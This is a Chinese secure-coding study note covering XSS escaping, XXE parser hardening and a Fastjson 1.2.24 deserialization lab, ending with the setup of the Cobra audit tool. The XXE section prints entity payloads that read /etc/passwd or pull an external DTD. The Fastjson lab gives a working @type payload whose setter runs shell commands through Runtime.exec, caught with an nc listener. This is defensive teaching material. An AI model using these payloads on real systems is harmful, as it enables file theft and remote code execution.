+攻击者利用 web 应用程序提供的录入或修改数据功能，将数据存储到服务器或用户cookie 中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本。所有浏览者都会受到攻击。
+</p>
+
+<p>
+3、DOM 跨站攻击
+</p>
+
+<p>
+由于 html 页面中，定义了一段 JS，根据用户的输入，显示一段 html 代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。
+</p>
+
+<p>
+DOM 跨站和以上两个跨站攻击的差别是，DOM 跨站是纯页面脚本的输出，只有规范使用 JAVASCRIPT，才可以防御。
+</p>
+
+<p>
+恶意攻击者可以利用跨站脚本攻击做到：
+1、盗取用户 cookie，伪造用户身份登录。
+2、控制用户浏览器。
+3、结合浏览器及其插件漏洞，下载病毒木马到浏览者的计算机上执行。
+4、衍生 URL 跳转漏洞。
+5、让官方网站出现钓鱼页面。
+6、蠕虫攻击
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+直接在 html 页面展示“用户可控数据”，将直接导致跨站脚本威胁。
+</p>
+
+<p>
+1.Java 示例： JSP 文件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #a020f0;">while</span>(rs.next())
+{
+    %&gt;
+    &lt;tr&gt;
+    &lt;td&gt;&lt;%=rs.getInt(<span style="color: #8b2252;">"id"</span>) %&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;%=rs.getString(<span style="color: #8b2252;">"pname"</span>)%&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;%=rs.getString(<span style="color: #8b2252;">"pdesc"</span>)%&gt;&lt;/td&gt;
+    &lt;td&gt;&lt;%=rs.getString(<span style="color: #8b2252;">"ptype"</span>)%&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;%
+}
+</pre>
+</div>
+
+<p>
+代码中的几个变量被直接输出到了页面中，没有做任何安 全过滤，一旦让用户可以输入数据，都可能导致用户浏览器把“用户可控数据”当成JS脚本执行，或页面元素被“用户可控数据”插入的页面 HTML 代码控制，从而造成攻击。
+</p>
+
+<ol class="org-ol">
+<li>直接返回用户输入的内容.</li>
+</ol>
+</div>
+<div id="outline-container-h:fabd7c38-6363-4c61-8973-bb4ef9e1a513" class="outline-3">
+<h3 id="h:fabd7c38-6363-4c61-8973-bb4ef9e1a513">解决方案</h3>
+<div class="outline-text-3" id="text-h:fabd7c38-6363-4c61-8973-bb4ef9e1a513">
+<p>
+<b>HTML/XML 页面输出规范：</b>
+</p>
+
+<p>
+1.在 HTML/XML 中显示“用户可控数据”前，应该进行 html escape 转义。
+</p>
+
+<p>
+JAVA 示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;div&gt;<span style="color: #b22222;">#</span><span style="color: #b22222;">escapeHTML($user.name) &lt;/div&gt;</span>
+
+&lt;td&gt;<span style="color: #b22222;">#</span><span style="color: #b22222;">escapeHTML($user.name)&lt;/td&gt;</span>
+
+&#25152;&#26377; HTML &#21644; XML &#20013;&#36755;&#20986;&#30340;&#25968;&#25454;&#65292;&#37117;&#24212;&#35813;&#20570; html escape &#36716;&#20041;&#12290;
+</pre>
+</div>
+
+<p>
+2.在 javascript 内容中输出的“用户可控数据”，需要做 javascript escape 转义。
+</p>
+
+<p>
+html 转义并不能保证在脚本执行区域内数据的安全，也不能保证脚本执行代码的正常运行。
+</p>
+
+<p>
+JAVA 示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;script&gt;alert(<span style="color: #8b2252;">'#escapeJavaScript($user.name)'</span>)&lt;/script&gt;
+
+&lt;script&gt;<span style="color: #a0522d;">x</span>=<span style="color: #8b2252;">'#escapeJavaScript($user.name)'</span>&lt;/script&gt;
+
+&lt;div <span style="color: #a0522d;">onmouseover</span>=<span style="color: #8b2252;">"x='#escapeJavaScript($user.name)'"</span>&lt;/div&gt;
+</pre>
+</div>
+
+<p>
+3.在给用户设置认证 COOKIE 时，加入 HTTPONLY
+js代码就访问不了cookie了
+</p>
+
+<p>
+<b>AJAX 输出规范：</b>
+</p>
+
+<p>
+1、XML 输出“用户可控数据”时，对数据部分做 HTML 转义。示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span> <span style="color: #a0522d;">encoding</span>=<span style="color: #8b2252;">"UTF-8"</span> ?&gt;
+&lt;man&gt;
+&lt;name&gt;**#xmlEscape($<span style="color: #a0522d;">name</span>)**&lt;/name&gt;
+&lt;man&gt;
+</pre>
+</div>
+
+<p>
+2、json 输出要先对变量内容中的“用户可控数据”单独作 htmlEscape，再对变量内容做一次 javascriptEscape。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">String <span style="color: #a0522d;">cityname</span>=&#8221;&#27993;&#27743;&lt;B&gt;&#8221;+StringUtil.htmlEscape(city.name)+&#8221;&lt;/B&gt;&#8221;;
+String json =
+<span style="color: #8b2252;">"citys:{city:['"</span>+
+<span style="color: #0000ff;">StringUtil.javascriptEscape</span>(cityname) + <span style="color: #8b2252;">"']}"</span>;
+</pre>
+</div>
+
+<p>
+3、非 xml 输出（包括 json、其他自定义数据格式），response 包中的 http 头的contentType，必须为 json，并且用户可控数据做 htmlEscape 后才能输出。
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #0000ff;">response.setContentType</span>(<span style="color: #8b2252;">"application/json"</span>);
+PrintWriter out = response.getWriter();
+<span style="color: #0000ff;">out.println</span>(StringUtil.htmlEscape(ajaxReturn));
+</pre>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:e655c591-dc83-4318-9886-a7fdba96e742" class="outline-2">
+<h2 id="h:e655c591-dc83-4318-9886-a7fdba96e742">XXE</h2>
+<div class="outline-text-2" id="text-h:e655c591-dc83-4318-9886-a7fdba96e742">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+当开发人员配置其XML解析功能允许外部实体引用时，攻击者可利用其引发安全问题的配置方式，实施任意文件读取、内网端口探测、命令执行、拒绝服务等方面的攻击。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+xml示例
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY % xxe SYSTEM <span style="color: #8b2252;">"http://xxx.xxx.xxx/cici.dtd"</span> &gt;
+%xxe;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</pre>
+</div>
+
+<p>
+读取系统文件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span>?&gt;
+&lt;!DOCTYPE cici[
+&lt;!ENTITY f SYSTEM <span style="color: #8b2252;">"file:///etc/passwd"</span>&gt;
+]&gt;
+
+&lt;hhh&gt;&amp;f;&lt;/hhh&gt;
+</pre>
+</div>
+
+<p>
+Java 解析xml文件的方式
+1.SAXReader
+防止 Java org.dom4j.io.SAXReader 模块的XXE 漏洞
+使用 saxReader 时，需设置以下三项才能保证防止XXE攻击
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #b22222;">// </span><span style="color: #b22222;">&#31105;&#29992;doctype</span>
+saxReader.setFeature(<span style="color: #8b2252;">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span style="color: #008b8b;">true</span>);
+<span style="color: #b22222;">// </span><span style="color: #b22222;">&#31105;&#29992;&#19968;&#33324;&#22806;&#37096;&#23454;&#20307;</span>
+saxReader.setFeature(<span style="color: #8b2252;">"http://xml.org/sax/features/external-general-entities"</span>, <span style="color: #008b8b;">false</span>);
+<span style="color: #b22222;">// </span><span style="color: #b22222;">&#31105;&#29992;&#22806;&#37096;&#23454;&#20307;&#21442;&#25968;</span>
+saxReader.setFeature(<span style="color: #8b2252;">"http://xml.org/sax/features/external-parameter-entities"</span>, <span style="color: #008b8b;">false</span>);
+</pre>
+</div>
+
+<p>
+2.XMLInputFactory（StAX 解析器）
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #b22222;">// </span><span style="color: #b22222;">This disables DTDs entirely for that factory</span>
+xmlInputFactory.setProperty(<span style="color: #008b8b;">XMLInputFactory</span>.<span style="color: #228b22;">SUPPORT_DTD</span>, <span style="color: #008b8b;">false</span>);
+<span style="color: #b22222;">// </span><span style="color: #b22222;">This causes XMLStreamException to be thrown if external DTDs are accessed.</span>
+xmlInputFactory.setProperty(<span style="color: #008b8b;">XMLConstants</span>.ACCESS_EXTERNAL_DTD, <span style="color: #8b2252;">""</span>);
+<span style="color: #b22222;">// </span><span style="color: #b22222;">disable external entities</span>
+xmlInputFactory.setProperty(<span style="color: #8b2252;">"javax.xml.stream.isSupportingExternalEntities"</span>, <span style="color: #008b8b;">false</span>);
+</pre>
+</div>
+
+<p>
+3.SAXBuilder
+使用 Java org.jdom2.input.SAXBuilder 模块时防止XXE漏洞
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">SAXBuilder</span> <span style="color: #a0522d;">builder</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">SAXBuilder</span>();
+builder.setFeature(<span style="color: #8b2252;">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span style="color: #008b8b;">true</span>);
+builder.setFeature(<span style="color: #8b2252;">"http://xml.org/sax/features/external-general-entities"</span>, <span style="color: #008b8b;">false</span>);
+builder.setFeature(<span style="color: #8b2252;">"http://xml.org/sax/features/external-parameter-entities"</span>, <span style="color: #008b8b;">false</span>);
+builder.setExpandEntities(<span style="color: #008b8b;">false</span>);
+<span style="color: #228b22;">Document</span> <span style="color: #a0522d;">doc</span> = builder.build(<span style="color: #a020f0;">new</span> <span style="color: #228b22;">File</span>(fileName));
+</pre>
+</div>
+
+<p>
+4.DocumentBuilder
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">DocumentBuilder</span> <span style="color: #a0522d;">builder</span> = factory.newDocumentBuilder();
+builder.setFeature(<span style="color: #8b2252;">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span style="color: #008b8b;">true</span>);
+builder.setFeature(<span style="color: #8b2252;">"http://xml.org/sax/features/external-general-entities"</span>, <span style="color: #008b8b;">false</span>);
+builder.setFeature(<span style="color: #8b2252;">"http://xml.org/sax/features/external-parameter-entities"</span>, <span style="color: #008b8b;">false</span>);
+<span style="color: #b22222;">// </span><span style="color: #b22222;">Disable external DTDs as well</span>
+builder.setFeature(<span style="color: #8b2252;">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>,<span style="color: #008b8b;">false</span>);
+<span style="color: #228b22;">Document</span> <span style="color: #a0522d;">d</span> = builder.parse(data);
+<span style="color: #228b22;">NodeList</span> <span style="color: #a0522d;">sList</span> = d.getElementsByTagName(<span style="color: #8b2252;">"student"</span>);
+</pre>
+</div>
+</div>
+</section>
+<section id="outline-container-h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564" class="outline-2">
+<h2 id="h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564">反序列化漏洞</h2>
+<div class="outline-text-2" id="text-h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564">
+</div>
+<div id="outline-container-Fastjson反序列化" class="outline-3">
+<h3 id="Fastjson反序列化">Fastjson反序列化</h3>
+<div class="outline-text-3" id="text-Fastjson反序列化">
+<p>
+漏洞描述
+fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改 @type 的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行这类问题。
+</p>
+
+<p>
+<b>测试代码</b>
+</p>
+
+<ol class="org-ol">
+<li>创建Maven项目</li>
+
+<li>在 pom 文件中添加 fastjson依赖</li>
+</ol>
+
+<p>
+xml文件如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span style="color: #000000; background-color: #ffffff;">&lt;?</span><span style="color: #a020f0;">xml</span> <span style="color: #8b2252;">version="1.0" encoding="UTF-8"</span><span style="color: #000000; background-color: #ffffff;">?&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">project</span> <span style="color: #483d8b;">xmlns</span>=<span style="color: #8b2252;">"http://maven.apache.org/POM/4.0.0"</span>
+         <span style="color: #483d8b;">xmlns</span><span style="color: #000000; background-color: #ffffff;">:</span><span style="color: #a0522d;">xsi</span>=<span style="color: #8b2252;">"http://www.w3.org/2001/XMLSchema-instance"</span>
+         <span style="color: #483d8b;">xsi</span><span style="color: #000000; background-color: #ffffff;">:</span><span style="color: #a0522d;">schemaLocation</span>=<span style="color: #8b2252;">"http://maven.apache.org/POM/4.0.0</span>
+<span style="color: #8b2252;">                             http://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">modelVersion</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">4.0.0</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">modelVersion</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">groupId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">org.example</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">groupId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">artifactId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">FastjsonDemo</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">artifactId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">version</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">1.0-SNAPSHOT</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">version</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">properties</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">maven.compiler.source</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">8</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">maven.compiler.source</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">maven.compiler.target</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">8</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">maven.compiler.target</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">properties</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">dependencies</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">dependency</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+      <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">groupId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">com.alibaba</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">groupId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+      <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">artifactId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">fastjson</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">artifactId</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+      <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">version</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">1.2.24</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">version</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">dependency</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">dependencies</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">project</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>点击 Maven 同步依赖</li>
+
+<li>先看一下 fastjson 的功能，可以将字符串反序列化成json</li>
+</ol>
+
+<p>
+写一个 CiciUser 类，在set方法中添加执行命令的代码，命令内容为打开 Safari 浏览器
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">package</span> cici.<span style="color: #008b8b;">fastjsonDemo</span>;
+
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">com</span>.<span style="color: #008b8b;">alibaba</span>.<span style="color: #008b8b;">fastjson</span>.<span style="color: #228b22;">JSON</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">com</span>.<span style="color: #008b8b;">alibaba</span>.<span style="color: #008b8b;">fastjson</span>.<span style="color: #228b22;">JSONObject</span>;
+
+<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">class</span> <span style="color: #228b22;">Test</span> {
+    <span style="color: #a020f0;">public</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">main</span>(<span style="color: #228b22;">String</span>[] <span style="color: #a0522d;">args</span>) {
+        <span style="color: #228b22;">String</span> <span style="color: #a0522d;">data</span> = <span style="color: #8b2252;">"{\"name\": \"cici\"}"</span>;
+        <span style="color: #228b22;">JSONObject</span> <span style="color: #a0522d;">cici_json</span> = JSON.parseObject(data);
+        System.out.println(cici_json.get(<span style="color: #8b2252;">"name"</span>));
+        System.out.println(cici_json);
+    }
+}
+
+<span style="color: #b22222;">// </span><span style="color: #b22222;">&#25191;&#34892;&#32467;&#26524;</span>
+<span style="color: #b22222;">// </span><span style="color: #b22222;">cici</span>
+<span style="color: #b22222;">// </span><span style="color: #b22222;">{"name":"cici"}</span>
+</pre>
+</div>
+
+<p>
+从漏洞描述中我们知道，当fastjson进行反序列化时会设置类的属性，也就是会自动调用 get/set 方法，那么我们就可以写一个类来进行测试。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">package</span> <span style="color: #008b8b;">exp</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">io</span>.<span style="color: #228b22;">IOException</span>;
+<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciUser</span> {
+    <span style="color: #a020f0;">private</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">name</span>;
+    <span style="color: #a020f0;">private</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">age</span>;
+    <span style="color: #a020f0;">public</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">setAge</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">properties</span>) <span style="color: #a020f0;">throws</span> <span style="color: #228b22;">IOException</span> {
+        System.out.println(<span style="color: #8b2252;">"setProperties is running..."</span>);
+        Runtime.getRuntime().exec(<span style="color: #8b2252;">"open /Applications/Safari.app"</span>);
+        <span style="color: #a020f0;">this</span>.age = properties;
+    }
+    <span style="color: #a020f0;">public</span> <span style="color: #228b22;">String</span> <span style="color: #0000ff;">getName</span>() {
+        System.out.println(<span style="color: #8b2252;">"getName is running ..."</span>);
+        <span style="color: #a020f0;">return</span> name;
+    }
+    <span style="color: #a020f0;">public</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">setName</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">name</span>) {
+        System.out.println(<span style="color: #8b2252;">"setName is running ..."</span>);
+        <span style="color: #a020f0;">this</span>.name = name;
+    }
+}
+</pre>
+</div>
+
+<p>
+新写一个fastjson解析函数，解析的字符串中 @type 内容为我们写好的类的路径 exp.CiciUser ，同时设置属性
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">package</span> cici.<span style="color: #008b8b;">fastjsonDemo</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">com</span>.<span style="color: #008b8b;">alibaba</span>.<span style="color: #008b8b;">fastjson</span>.<span style="color: #228b22;">JSON</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">com</span>.<span style="color: #008b8b;">alibaba</span>.<span style="color: #008b8b;">fastjson</span>.<span style="color: #228b22;">JSONObject</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">exp</span>.<span style="color: #228b22;">CiciUser</span>;
+<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">class</span> <span style="color: #228b22;">Test</span> {
+    <span style="color: #a020f0;">public</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">main</span>(<span style="color: #228b22;">String</span>[] <span style="color: #a0522d;">args</span>) {
+        <span style="color: #228b22;">String</span> <span style="color: #a0522d;">payload2</span> = <span style="color: #8b2252;">"{\"@type\":\"exp.CiciUser\", \"name\":\"cici\",\"age\":\"\"}"</span>;
+        <span style="color: #228b22;">Object</span> <span style="color: #a0522d;">obj</span> = JSON.parse(payload2);
+        System.out.println(obj);
+    }
+}
+</pre>
+</div>
+
+<p>
+将 CiciUser 中的 Poc 改为 curl htpp://127.0.0.1:8888
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">package</span> <span style="color: #008b8b;">exp</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">io</span>.<span style="color: #228b22;">IOException</span>;
+<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciUser</span> {
+    <span style="color: #a020f0;">private</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">name</span>;
+    <span style="color: #a020f0;">private</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">age</span>;
+    <span style="color: #a020f0;">public</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">setAge</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">properties</span>) <span style="color: #a020f0;">throws</span> <span style="color: #228b22;">IOException</span> {
+        System.out.println(<span style="color: #8b2252;">"setProperties is running..."</span>);
+        Runtime.getRuntime().exec(<span style="color: #8b2252;">"curl http://127.0.0.1:8888"</span>);
+        <span style="color: #a020f0;">this</span>.age = properties;
+    }
+    <span style="color: #a020f0;">public</span> <span style="color: #228b22;">String</span> <span style="color: #0000ff;">getName</span>() {
+        System.out.println(<span style="color: #8b2252;">"getName is running ..."</span>);
+        <span style="color: #a020f0;">return</span> name;
+    }
+    <span style="color: #a020f0;">public</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">setName</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">name</span>) {
+        System.out.println(<span style="color: #8b2252;">"setName is running ..."</span>);
+        <span style="color: #a020f0;">this</span>.name = name;
+    }
+}
+</pre>
+</div>
+
+<p>
+用nc监听本地 8888 端口， 同时使用 curl 访问本地 8888 端口 ，可以看到nc收到HTTP请求信息
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">nc -l 8888
+</pre>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:8dae0942-47ab-40be-ad06-5a54cb800b13" class="outline-2">
+<h2 id="h:8dae0942-47ab-40be-ad06-5a54cb800b13">审计工具-Cobra</h2>
+<div class="outline-text-2" id="text-h:8dae0942-47ab-40be-ad06-5a54cb800b13">
+<p>
+RIPS
+</p>
+<ul class="org-ul">
+<li>无法识别框架，框架输入</li>
+<li>无法自定义规则</li>
+<li>数据流分析，无法跨文件</li>
+</ul>
+</div>
+<div id="outline-container-h:0d57d80b-36a8-4def-8d6a-2c1877295383" class="outline-3">
+<h3 id="h:0d57d80b-36a8-4def-8d6a-2c1877295383">介绍</h3>
+<div class="outline-text-3" id="text-h:0d57d80b-36a8-4def-8d6a-2c1877295383">
+<p>
+<b>什么是“源代码安全审计(白盒扫描)”</b>
+</p>
+
+<p>
+由于开发人员的技术水平和安全意识各不相同，导致可能开发出一些存在安全漏洞的代码。 攻击者可以通过渗透测试来找到这些漏洞，从而导致应用被攻击、服务器被入侵、数据被下载、业务受到影响等等问题。 “源代码安全审计”是指通过审计发现源代码中的安全隐患和漏洞，而Cobra可将这个流程自动化。
+</p>
+
+<p>
+现在也不维护了，但在开源里是个比较出名的工具。
+</p>
+
+<p>
+<b>Cobra为什么能从源代码中扫描到漏洞</b>
+</p>
+
+<p>
+对于一些特征较为明显的可以使用正则规则来直接进行匹配出，比如硬编码密码、错误的配置等。 对于OWASP Top 10的漏洞，Cobra通过预先梳理能造成危害的函数，并定位代码中所有出现该危害函数的地方，继而基于Lex(Lexical Analyzer Generator, 词法分析生成器)和Yacc(Yet Another Compiler-Compiler, 编译器代码生成器)将对应源代码解析为AST(Abstract Syntax Tree, 抽象语法树)，分析危害函数的入参是否可控来判断是否存在漏洞（目前仅接入了PHP-AST，其它语言AST接入中）。
+</p>
+
+<p>
+<b>Cobra和其它源代码审计系统有什么区别或优势</b>
+</p>
+
+<p>
+Cobra定位是自动化发现源代码中大部分显著的安全问题，对于一些隐藏较深或特有的问题建议人工审计。
+</p>
+
+<ul class="org-ul">
+<li>开发源代码（基于开放的MIT License，可更改源码）</li>
+<li>支持开发语言多（支持十多种开发语言和文件类型）</li>
+<li>支持漏洞类型多（支持数十种漏洞类型）</li>
+<li>支持各种场景集成（提供API也可以命令行使用）</li>
+<li>专业支持，持续维护（由白帽子、开发工程师和安全工程师一起持续维护更新，并在多家企业内部使用）</li>
+</ul>
+
+<p>
+<b>Cobra支持哪些开发语言</b>
+</p>
+
+<p>
+目前Cobra主要支持PHP、Java等主要开发语言及其它数十种文件类型，并持续更新规则和引擎以支持更多开发语言，具体见支持的<a href="https://blog.csdn.net/jufengada9/article/details/105203470">开发语言和文件类型</a>。
+</p>
+
+<p>
+<b>Cobra能发现哪些漏洞</b>
+</p>
+
+<p>
+覆盖大部分Web端常见漏洞和一些移动端（Android、iOS）通用漏洞，具体见支持的<a href="https://blog.csdn.net/jufengada9/article/details/105203470">漏洞类型</a>。
+</p>
+</div>
+</div>
+<div id="outline-container-h:a4e1c5e6-566a-4df5-8ac1-f937427e5906" class="outline-3">
+<h3 id="h:a4e1c5e6-566a-4df5-8ac1-f937427e5906">Installation(安装)</h3>
+<div class="outline-text-3" id="text-h:a4e1c5e6-566a-4df5-8ac1-f937427e5906">
+<p>
+<b>系统支持</b>
+</p>
+
+<p>
+mac OS 支持
+Linux 支持
+Windows 暂不支持
+</p>
+
+<p>
+<b>Kali安装python2 pip</b>
+</p>
+
+<p>
+使用kali系统自带的python2.7时，需要下载pip2.7；
+1.更新apt源
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">vim /etc/apt/sources.list
+</pre>
+</div>
+
+<p>
+2.下载pip2.7
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#19979;&#36733;pip2.7</span>
+wget --no-check-certificate <span style="color: #8b2252;">'https://bootstrap.pypa.io/pip/2.7/get-pip.py'</span>
+python2 get-pip.py
+</pre>
+</div>
+
+<p>
+<b>安装方法</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">git clone https://github.com/WhaleShark-Team/cobra.git &amp;&amp; <span style="color: #483d8b;">cd</span> cobra
+pip install -r requirements.txt
+python cobra.py --help
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:307d6dd6-29d4-4567-a347-1cc8936c1391" class="outline-3">
+<h3 id="h:307d6dd6-29d4-4567-a347-1cc8936c1391">CLI模式</h3>
+<div class="outline-text-3" id="text-h:307d6dd6-29d4-4567-a347-1cc8936c1391">
+<p>
+<b>Examples（使用例子）</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#19968;&#20010;&#25991;&#20214;&#22841;&#30340;&#20195;&#30721;</span>
+$ python cobra.py -t tests/vulnerabilities
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#20195;&#30721;</span>
